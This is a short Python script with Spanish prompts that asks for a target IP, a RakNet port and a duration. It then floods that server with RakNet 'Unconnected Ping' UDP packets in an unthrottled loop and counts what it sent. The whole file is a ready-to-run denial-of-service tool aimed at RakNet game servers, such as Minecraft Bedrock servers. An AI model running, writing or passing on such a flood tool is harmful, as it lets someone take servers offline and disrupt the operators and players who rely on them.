import struct
import time
import socket

# Solicitar al usuario la IP, el puerto y la duración
ip = input("Introduce la IP del servidor objetivo: ")
port = int(input("Introduce el puerto del servidor RakNet: "))
duration = int(input("Introduce el tiempo de duración en segundos: "))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
end_time = time.time() + duration  # Duración configurable

packet_id = 0x01
magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
packet_prefix = struct.pack('!B', packet_id) + magic

count = 0
sendto = sock.sendto
addr = (ip, port)

# Opcional: aumentar el buffer del socket para evitar bloqueos
sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**16)

while time.time() < end_time:
    timestamp = int(time.time() * 1000)
    packet = packet_prefix[:1] + struct.pack('>Q', timestamp) + packet_prefix[1:]
    sendto(packet, addr)
    count += 1

print(f"Enviados {count} paquetes Unconnected Ping en {duration} segundos a {ip}:{port}")
